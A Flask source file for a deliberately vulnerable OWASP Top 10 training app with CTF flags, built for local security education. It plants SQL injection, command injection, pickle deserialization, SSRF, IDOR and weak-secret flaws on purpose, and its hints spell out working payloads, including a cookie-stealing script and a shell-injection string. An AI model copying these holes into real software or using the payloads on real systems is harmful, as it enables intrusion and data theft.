"""
VulnPlayground - Deliberately Vulnerable Flask Application
OWASP Top 10 (2021) - Educational / Portfolio Demo

⚠️  FOR LOCAL USE ONLY — NEVER DEPLOY TO PRODUCTION

Each vulnerability contains a hidden flag in the format FLAG{...}
Flags are discovered through real exploitation, not handed to you.
Submit flags on the /exercises page to track progress.
"""

import sqlite3
import os
import pickle
import base64
import hashlib
import requests
import subprocess
import re
from flask import (
    Flask, request, render_template, redirect, url_for,
    session, jsonify, make_response, abort
)
from functools import wraps
from datetime import datetime

# Resolve paths relative to this file so the app works regardless of
# which directory you launch it from (e.g. python VulnPlayground/app.py)
_HERE = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__,
            template_folder=os.path.join(_HERE, "templates"),
            static_folder=os.path.join(_HERE, "static"))

# ══════════════════════════════════════════════════
# A05 — SECURITY MISCONFIGURATION
# Hardcoded weak secret key + debug mode enabled
# ══════════════════════════════════════════════════
app.secret_key = "supersecretkey123"
app.config["DEBUG"] = True

DB_PATH = os.path.join(_HERE, "VulnPlayground.db")

# ──────────────────────────────────────────────────
# FLAGS  (don't look here — find them by exploiting)
# ──────────────────────────────────────────────────
FLAGS = {
    "A01_IDOR":      "FLAG{1d0r_n0_0wn3rsh1p_ch3ck_byp4ss}",
    "A01_ADMIN":     "FLAG{s3ss10n_f0rg3ry_4dm1n_pwn3d}",
    "A02_CRYPTO":    "FLAG{md5_r41nb0w_t4bl3_cr4ck3d}",
    "A03_SQLI":      "FLAG{un10n_b4s3d_sql1_d4t4_dump}",
    "A03_XSS":       "FLAG{st0r3d_xss_c00k13_st34l3r}",
    "A03_CMDI":      "FLAG{0s_cmdi_sh3ll_3x3cut10n}",
    "A04_DESIGN":    "FLAG{n3g4t1v3_4m0unt_bus1n3ss_l0g1c}",
    "A05_MISCONFIG": "FLAG{d3bug_m0d3_s3cr3t_k3y_l34k3d}",
    "A07_AUTH":      "FLAG{n0_r4t3_l1m1t_br0k3n_4uth}",
    "A08_DESERIAL":  "FLAG{p1ckl3_rce_4rg_r3duc3_pwn3d}",
    "A09_LOGGING":   "FLAG{n0_l0gz_n0_4ud1t_tr41l_ev3r}",
    "A10_SSRF":      "FLAG{ssrf_1nt3rn4l_s3rv1c3_4cc3ss}",
}

CHALLENGE_META = [
    {
        "id": "A01_IDOR",
        "code": "A01",
        "title": "Broken Access Control — IDOR",
        "endpoint": "/note/&lt;id&gt;",
        "difficulty": "Easy",
        "objective": "Read the admin's private note as a low-privilege user. The flag is inside the note content.",
        "hints": [
            "Notes have sequential IDs. Try /note/1 while logged in as alice.",
            "No ownership check exists on the server — it fetches any note by ID.",
            "The admin's note (ID 1) contains the flag.",
        ],
    },
    {
        "id": "A01_ADMIN",
        "code": "A01",
        "title": "Broken Access Control — Session Forgery",
        "endpoint": "/admin",
        "difficulty": "Medium",
        "objective": "Access the admin panel as a regular user by forging the Flask session cookie. The flag appears on the admin panel.",
        "hints": [
            "The app secret key is hardcoded and exposed at /api/health.",
            "Install: pip install flask-unsign",
            "flask-unsign --sign --cookie \"{'role':'admin','user_id':1,'username':'admin'}\" --secret supersecretkey123",
        ],
    },
    {
        "id": "A02_CRYPTO",
        "code": "A02",
        "title": "Cryptographic Failures — Weak Hashing",
        "endpoint": "/profile",
        "difficulty": "Easy",
        "objective": "Crack alice's MD5 password hash shown on the profile page. View the page source for a hidden comment containing the flag once cracked.",
        "hints": [
            "Log in as alice and visit /profile to see the MD5 hash.",
            "Use crackstation.net to crack the hash instantly.",
            "The flag is hidden in an HTML comment on the profile page.",
        ],
    },
    {
        "id": "A03_SQLI",
        "code": "A03",
        "title": "Injection — SQL Injection (UNION-based)",
        "endpoint": "/search",
        "difficulty": "Medium",
        "objective": "Use a UNION-based SQL injection on /search to dump a hidden 'secrets' table. The flag is a row value in that table.",
        "hints": [
            "The query selects 3 columns: id, username, email.",
            "Confirm injection: ' UNION SELECT 1,2,3--",
            "Dump the table: ' UNION SELECT id,name,value FROM secrets--",
        ],
    },
    {
        "id": "A03_XSS",
        "code": "A03",
        "title": "Injection — Stored XSS",
        "endpoint": "/board",
        "difficulty": "Easy",
        "objective": "Post a payload to the message board that steals the admin bot's session cookie. The cookie contains the flag. Check /board/stolen-cookies after triggering the admin bot.",
        "hints": [
            "Post: <script>fetch('/steal?c='+document.cookie)</script>",
            "Click 'Trigger Admin Bot' to simulate the admin visiting the board.",
            "Check /board/stolen-cookies to see the captured cookie with the flag.",
        ],
    },
    {
        "id": "A03_CMDI",
        "code": "A03",
        "title": "Injection — OS Command Injection",
        "endpoint": "/ping",
        "difficulty": "Easy",
        "objective": "Inject a shell command into the ping tool to read the contents of /tmp/cmdi_flag.txt",
        "hints": [
            "The server runs: ping -c 2 <your_input> with shell=True.",
            "Test with: 127.0.0.1; id",
            "Read the flag: 127.0.0.1; cat /tmp/cmdi_flag.txt",
        ],
    },
    {
        "id": "A04_DESIGN",
        "code": "A04",
        "title": "Insecure Design — Business Logic Flaw",
        "endpoint": "/transfer",
        "difficulty": "Easy",
        "objective": "Exploit the transfer feature to drain another user's balance below $0 using a negative amount. The flag appears when the exploit succeeds.",
        "hints": [
            "No server-side validation exists on the transfer amount.",
            "Enter a large negative number as the amount (e.g. -9999).",
            "When the target's balance goes negative, the flag is revealed.",
        ],
    },
    {
        "id": "A05_MISCONFIG",
        "code": "A05",
        "title": "Security Misconfiguration — Info Disclosure",
        "endpoint": "/api/health",
        "difficulty": "Easy",
        "objective": "Find the flag exposed by the unauthenticated /api/health endpoint.",
        "hints": [
            "Visit /api/health directly in your browser — no login required.",
            "Read the JSON response carefully.",
            "One of the fields contains the flag.",
        ],
    },
    {
        "id": "A07_AUTH",
        "code": "A07",
        "title": "Auth Failures — No Rate Limiting",
        "endpoint": "/login",
        "difficulty": "Medium",
        "objective": "Brute-force the login endpoint. After 10+ failed attempts against any account, the server exposes a flag in the HTML response to demonstrate the lack of lockout.",
        "hints": [
            "Write a Python requests loop or use Burp Intruder.",
            "POST to /login with username=bob and iterate passwords.",
            "After 10 failures the response HTML will contain the flag.",
        ],
    },
    {
        "id": "A08_DESERIAL",
        "code": "A08",
        "title": "Data Integrity — Insecure Deserialization (RCE)",
        "endpoint": "/prefs",
        "difficulty": "Hard",
        "objective": "Craft a malicious pickle payload that executes: cat /tmp/deserial_flag.txt and returns the output.",
        "hints": [
            "The server calls pickle.loads(base64.b64decode(your_input)).",
            "Use __reduce__ to invoke os.popen('cat /tmp/deserial_flag.txt').read()",
            "Generate: import pickle,base64,os; class P:\\n  def __reduce__(self): return(os.popen,'cat /tmp/deserial_flag.txt'); print(base64.b64encode(pickle.dumps(P())))",
        ],
    },
    {
        "id": "A09_LOGGING",
        "code": "A09",
        "title": "Security Logging Failures",
        "endpoint": "(entire app)",
        "difficulty": "Easy",
        "objective": "Demonstrate the absence of security logging: perform a SQL injection on /search, then check whether any log file recorded it. Claim the flag when you confirm no audit trail exists.",
        "hints": [
            "Run a SQL injection payload on /search.",
            "Check the app directory: ls -la *.log",
            "No log file exists. Click 'Claim Flag' below to collect this one.",
        ],
    },
    {
        "id": "A10_SSRF",
        "code": "A10",
        "title": "Server-Side Request Forgery",
        "endpoint": "/fetch",
        "difficulty": "Medium",
        "objective": "Use the URL fetcher to reach an internal-only endpoint not directly accessible from your browser. The flag is in its JSON response.",
        "hints": [
            "The /api/internal endpoint returns 403 to your browser.",
            "But when the server fetches it, the request originates from 127.0.0.1.",
            "Fetch: http://127.0.0.1:5000/api/internal",
        ],
    },
]


# ══════════════════════════════════════════════════
# DATABASE SETUP
# ══════════════════════════════════════════════════

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("""CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT,
        role TEXT DEFAULT 'user', email TEXT, ssn TEXT, balance REAL DEFAULT 1000.0
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY, from_user INTEGER, to_user INTEGER,
        amount REAL, note TEXT, timestamp TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY, author TEXT, content TEXT, timestamp TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS notes (
        id INTEGER PRIMARY KEY, user_id INTEGER, content TEXT
    )""")

    # Hidden table — discovered via SQL injection
    c.execute("""CREATE TABLE IF NOT EXISTS secrets (
        id INTEGER PRIMARY KEY, name TEXT, value TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS completions (
        id INTEGER PRIMARY KEY, user_id INTEGER, challenge_id TEXT,
        completed_at TEXT, UNIQUE(user_id, challenge_id)
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS login_attempts (
        id INTEGER PRIMARY KEY, username TEXT, ip TEXT, success INTEGER, timestamp TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS stolen_cookies (
        id INTEGER PRIMARY KEY, cookie TEXT, ip TEXT, timestamp TEXT
    )""")

    users = [
        (1,"admin",  hashlib.md5(b"admin123").hexdigest(), "admin","admin@VulnPlayground.com",  "123-45-6789",99999.0),
        (2,"alice",  hashlib.md5(b"password").hexdigest(), "user", "alice@VulnPlayground.com",  "987-65-4321",2500.0),
        (3,"bob",    hashlib.md5(b"bob123").hexdigest(),   "user", "bob@VulnPlayground.com",    "555-12-3456",750.0),
        (4,"charlie",hashlib.md5(b"charlie").hexdigest(),  "user", "charlie@VulnPlayground.com","111-22-3333",300.0),
    ]
    c.executemany(
        "INSERT OR IGNORE INTO users (id,username,password,role,email,ssn,balance) VALUES (?,?,?,?,?,?,?)",
        users
    )

    messages_data = [
        (1,"system","Welcome to VulnPlayground. Keep your credentials safe.","2024-01-01 09:00:00"),
        (2,"alice", "Has anyone seen the new transfer feature?","2024-01-02 10:30:00"),
        (3,"admin", "Reminder: do not share your session token.","2024-01-02 11:00:00"),
    ]
    c.executemany(
        "INSERT OR IGNORE INTO messages (id,author,content,timestamp) VALUES (?,?,?,?)",
        messages_data
    )

    notes_data = [
        (1, 1, f"ADMIN ONLY - Deployment key: VB-PROD-9921\n\nChallenge Flag: {FLAGS['A01_IDOR']}"),
        (2, 2, "Reminder: expense report due Friday."),
        (3, 3, "Bob's salary negotiation notes — confidential."),
        (4, 4, "Charlie's personal banking notes."),
    ]
    c.executemany("INSERT OR IGNORE INTO notes (id,user_id,content) VALUES (?,?,?)", notes_data)

    secrets_data = [
        (1, "db_backup_key", "PROD-BACKUP-AES256-K3Y-9821"),
        (2, "sqli_flag",      FLAGS["A03_SQLI"]),
        (3, "api_token",      "vb-internal-api-xK92mP"),
    ]
    c.executemany("INSERT OR IGNORE INTO secrets (id,name,value) VALUES (?,?,?)", secrets_data)

    conn.commit()
    conn.close()

    os.makedirs("/tmp", exist_ok=True)  # /tmp is always absolute — no change needed
    with open("/tmp/cmdi_flag.txt", "w") as f:
        f.write(f"OS Command Injection achieved!\n{FLAGS['A03_CMDI']}\n")
    with open("/tmp/deserial_flag.txt", "w") as f:
        f.write(f"RCE via insecure deserialization.\n{FLAGS['A08_DESERIAL']}\n")


# ──────────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

def get_completions(user_id):
    conn = get_db()
    rows = conn.execute(
        "SELECT challenge_id FROM completions WHERE user_id=?", (user_id,)
    ).fetchall()
    conn.close()
    return {r["challenge_id"] for r in rows}

def mark_complete(user_id, challenge_id):
    conn = get_db()
    conn.execute(
        "INSERT OR IGNORE INTO completions (user_id,challenge_id,completed_at) VALUES (?,?,?)",
        (user_id, challenge_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()
    conn.close()


# ══════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════

@app.route("/")
def index():
    return render_template("index.html")


# ─── EXERCISES ────────────────────────────────────

@app.route("/exercises")
@login_required
def exercises():
    completed = get_completions(session["user_id"])
    score = len(completed)
    total = len(CHALLENGE_META)
    challenges_with_status = [
        {**ch, "done": ch["id"] in completed}
        for ch in CHALLENGE_META
    ]
    result  = request.args.get("result")
    ch_id   = request.args.get("ch")
    return render_template(
        "exercises.html",
        challenges=challenges_with_status,
        score=score,
        total=total,
        logging_flag=FLAGS["A09_LOGGING"],
        result=result,
        ch_id=ch_id,
    )

@app.route("/submit-flag", methods=["POST"])
@login_required
def submit_flag():
    submitted    = request.form.get("flag", "").strip()
    challenge_id = request.form.get("challenge_id", "")

    if challenge_id == "A09_LOGGING" and request.form.get("claim"):
        mark_complete(session["user_id"], "A09_LOGGING")
        return redirect(url_for("exercises") + "?result=correct&ch=A09_LOGGING")

    expected = FLAGS.get(challenge_id, "")
    if submitted == expected:
        mark_complete(session["user_id"], challenge_id)
        result = "correct"
    else:
        result = "wrong"
    return redirect(url_for("exercises") + f"?result={result}&ch={challenge_id}")


# ─── LOGIN / REGISTER ─────────────────────────────

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    brute_banner = None

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        pw_hash  = hashlib.md5(password.encode()).hexdigest()
        ip       = request.remote_addr

        conn = get_db()
        conn.execute(
            "INSERT INTO login_attempts (username,ip,success,timestamp) VALUES (?,?,?,?)",
            (username, ip, 0, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()

        attempt_count = conn.execute(
            "SELECT COUNT(*) FROM login_attempts WHERE username=? AND success=0",
            (username,)
        ).fetchone()[0]

        # A03 — Vulnerable raw string interpolation
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{pw_hash}'"
        try:
            user = conn.execute(query).fetchone()
        except Exception as e:
            return (
                f"<pre style='background:#111;color:#f00;padding:20px'>"
                f"DB Error: {e}\n\nQuery: {query}</pre>"
            ), 500

        if user:
            conn.execute(
                "UPDATE login_attempts SET success=1 WHERE id=(SELECT MAX(id) FROM login_attempts WHERE username=?)",
                (username,)
            )
            conn.commit()
            session["user_id"]  = user["id"]
            session["username"] = user["username"]
            session["role"]     = user["role"]
            if user["role"] == "admin":
                session["admin_flag"] = FLAGS["A03_XSS"]
            conn.close()
            return redirect(url_for("dashboard"))

        conn.close()
        error = "Invalid credentials."
        if attempt_count >= 10:
            brute_banner = FLAGS["A07_AUTH"]

    return render_template("login.html", error=error, brute_banner=brute_banner)


@app.route("/register", methods=["GET", "POST"])
def register():
    error = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        pw_hash  = hashlib.md5(password.encode()).hexdigest()
        try:
            conn = get_db()
            conn.execute(
                "INSERT INTO users (username,password,role,email) VALUES (?,?,?,?)",
                (username, pw_hash, "user", request.form.get("email",""))
            )
            conn.commit()
            conn.close()
            return redirect(url_for("login"))
        except Exception as e:
            error = str(e)
    return render_template("register.html", error=error)


# ─── SEARCH (SQLi) ────────────────────────────────

@app.route("/search")
@login_required
def search():
    q = request.args.get("q", "")
    conn = get_db()
    sql = f"SELECT id, username, email FROM users WHERE username LIKE '%{q}%'"
    try:
        results = conn.execute(sql).fetchall()
    except Exception as e:
        return (
            f"<pre style='background:#111;color:#f00;padding:20px'>"
            f"SQL Error: {e}\n\nQuery: {sql}</pre>"
        ), 500
    conn.close()
    return render_template("search.html", results=results, query=q)


# ─── BOARD (Stored XSS) ───────────────────────────

@app.route("/board", methods=["GET", "POST"])
@login_required
def board():
    conn = get_db()
    if request.method == "POST":
        content = request.form["content"]
        conn.execute(
            "INSERT INTO messages (author,content,timestamp) VALUES (?,?,?)",
            (session["username"], content, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
    messages_rows = conn.execute("SELECT * FROM messages ORDER BY id DESC").fetchall()
    conn.close()
    return render_template("board.html", messages=messages_rows)

@app.route("/steal")
def steal():
    """Simulated attacker endpoint for XSS exercise"""
    cookie_data = request.args.get("c", "")
    if cookie_data:
        conn = get_db()
        conn.execute(
            "INSERT INTO stolen_cookies (cookie,ip,timestamp) VALUES (?,?,?)",
            (cookie_data, request.remote_addr, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
        conn.close()
    return "", 200

@app.route("/board/stolen-cookies")
@login_required
def stolen_cookies():
    conn = get_db()
    cookies = conn.execute("SELECT * FROM stolen_cookies ORDER BY id DESC LIMIT 20").fetchall()
    conn.close()
    return render_template("stolen_cookies.html", cookies=cookies)

@app.route("/board/trigger-admin")
@login_required
def trigger_admin():
    """Simulates the admin bot visiting the board"""
    conn = get_db()
    messages_rows = conn.execute("SELECT content FROM messages ORDER BY id DESC LIMIT 10").fetchall()
    admin_cookie = f"session=admin_bot_token; admin_flag={FLAGS['A03_XSS']}"
    for msg in messages_rows:
        c = msg["content"].lower()
        if "/steal" in c or "fetch(" in c or "onerror" in c or "script" in c:
            conn.execute(
                "INSERT INTO stolen_cookies (cookie,ip,timestamp) VALUES (?,?,?)",
                (admin_cookie, "admin-bot-127.0.0.1", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            )
            conn.commit()
            break
    conn.close()
    return redirect(url_for("board"))

@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    return render_template("greet.html", name=name)


# ─── NOTE (IDOR) ──────────────────────────────────

@app.route("/note/<int:note_id>")
@login_required
def view_note(note_id):
    conn = get_db()
    note = conn.execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
    conn.close()
    if not note:
        abort(404)
    # VULNERABLE — no ownership check
    return render_template("note.html", note=note)


# ─── ADMIN (session forgery) ──────────────────────

@app.route("/admin")
@login_required
def admin_panel():
    if session.get("role") != "admin":
        return render_template("access_denied.html"), 403
    conn = get_db()
    users = conn.execute("SELECT id,username,email,ssn,balance,role FROM users").fetchall()
    conn.close()
    return render_template("admin.html", users=users, admin_flag=FLAGS["A01_ADMIN"])


# ─── PROFILE (crypto failures) ────────────────────

@app.route("/profile")
@login_required
def profile():
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE id=?", (session["user_id"],)).fetchone()
    conn.close()
    resp = make_response(render_template(
        "profile.html", user=user, crypto_flag=FLAGS["A02_CRYPTO"]
    ))
    resp.set_cookie("user_data", f"id={user['id']}&ssn={user['ssn']}&role={user['role']}")
    return resp


# ─── TRANSFER (insecure design) ───────────────────

@app.route("/transfer", methods=["GET", "POST"])
@login_required
def transfer():
    msg = None
    flag_reveal = None
    conn = get_db()
    users = conn.execute(
        "SELECT id,username,balance FROM users WHERE id != ?", (session["user_id"],)
    ).fetchall()

    if request.method == "POST":
        to_id  = int(request.form["to_user"])
        amount = float(request.form["amount"])
        note   = request.form.get("note", "")

        sender = conn.execute(
            "SELECT balance FROM users WHERE id=?", (session["user_id"],)
        ).fetchone()

        if sender["balance"] >= amount:
            conn.execute("UPDATE users SET balance=balance-? WHERE id=?", (amount, session["user_id"]))
            conn.execute("UPDATE users SET balance=balance+? WHERE id=?", (amount, to_id))
            conn.execute(
                "INSERT INTO transactions (from_user,to_user,amount,note,timestamp) VALUES (?,?,?,?,?)",
                (session["user_id"], to_id, amount, note, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            )
            conn.commit()
            victim = conn.execute("SELECT balance FROM users WHERE id=?", (to_id,)).fetchone()
            if victim and victim["balance"] < 0:
                flag_reveal = FLAGS["A04_DESIGN"]
                msg = "Business logic bypassed — target balance drained below $0."
            else:
                msg = f"Transferred ${amount:.2f} successfully."
        else:
            msg = "Insufficient funds."
    conn.close()
    return render_template("transfer.html", users=users, msg=msg, flag_reveal=flag_reveal)


# ─── API HEALTH (misconfig) ───────────────────────

@app.route("/api/health")
def health():
    return jsonify({
        "status": "ok",
        "app": "VulnPlayground",
        "flask_debug": app.config["DEBUG"],
        "secret_key": app.secret_key,
        "db_path": os.path.abspath(DB_PATH),
        "flag": FLAGS["A05_MISCONFIG"],
        "_note": "This endpoint should never be unauthenticated or expose internals.",
    })

@app.route("/api/internal")
def api_internal():
    """Internal-only endpoint — reachable only via SSRF (/fetch proxies with a server-side header)"""
    # This header is only added by the server's own fetch() call, not by a direct browser request.
    # It simulates a service that's firewalled from external clients but reachable server-side.
    if request.headers.get("X-VulnPlayground-Internal") != "ssrf-reachable":
        return jsonify({
            "error": "Forbidden. This endpoint is for internal services only.",
            "hint": "Access this via the /fetch SSRF endpoint: http://127.0.0.1:5000/api/internal",
        }), 403
    return jsonify({
        "service": "VulnPlayground Internal API",
        "db_admin_password": "vb-db-admin-p4ss",
        "flag": FLAGS["A10_SSRF"],
        "internal_hosts": ["redis://cache:6379", "postgres://db:5432"],
        "_note": "You reached this via SSRF. The server made this request on your behalf.",
    })


# ─── PREFS (deserialization) ──────────────────────

@app.route("/prefs", methods=["GET", "POST"])
@login_required
def prefs():
    result = None
    if request.method == "POST":
        data = request.form.get("prefs_data", "")
        try:
            decoded = base64.b64decode(data)
            obj = pickle.loads(decoded)
            result = str(obj)
        except Exception as e:
            result = f"Error: {e}"
    return render_template("prefs.html", result=result)


# ─── FETCH (SSRF) ─────────────────────────────────

@app.route("/fetch", methods=["GET", "POST"])
@login_required
def fetch_url():
    content = None
    url = ""
    if request.method == "POST":
        url = request.form.get("url", "")
        try:
            # The X-VulnPlayground-Internal header simulates the server being on an internal network.
            # Real SSRF works because the server has access to internal services the browser can't reach.
            r = requests.get(url, timeout=5, headers={"X-VulnPlayground-Internal": "ssrf-reachable"})
            content = r.text[:4000]
        except Exception as e:
            content = f"Error: {e}"
    return render_template("fetch.html", content=content, url=url)


# ─── PING (command injection) ─────────────────────

@app.route("/ping", methods=["GET", "POST"])
@login_required
def ping():
    output = None
    host = ""
    if request.method == "POST":
        host = request.form.get("host", "")
        try:
            output = subprocess.check_output(
                f"ping -c 2 {host}", shell=True,
                stderr=subprocess.STDOUT, timeout=10
            ).decode()
        except subprocess.TimeoutExpired:
            output = "Timeout."
        except Exception as e:
            output = str(e)
    return render_template("ping.html", output=output, host=host)


# ─── DASHBOARD ────────────────────────────────────

@app.route("/dashboard")
@login_required
def dashboard():
    conn = get_db()
    user = conn.execute(
        "SELECT id,username,balance,role FROM users WHERE id=?", (session["user_id"],)
    ).fetchone()
    txns = conn.execute(
        "SELECT * FROM transactions WHERE from_user=? OR to_user=? ORDER BY id DESC LIMIT 10",
        (session["user_id"], session["user_id"])
    ).fetchall()
    completed = get_completions(session["user_id"])
    conn.close()
    return render_template("dashboard.html", user=user, txns=txns,
                           score=len(completed), total=len(CHALLENGE_META))


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


if __name__ == "__main__":
    init_db()
    print("\n" + "=" * 58)
    print("  VulnPlayground  —  OWASP Top 10 Demo")
    print("  http://127.0.0.1:5000")
    print("  http://127.0.0.1:5000/exercises   <- Start here")
    print("  Creds: admin/admin123  alice/password  bob/bob123")
    print("  FOR LOCAL EDUCATIONAL USE ONLY")
    print("=" * 58 + "\n")
    app.run(debug=True, host="127.0.0.1", port=5000)
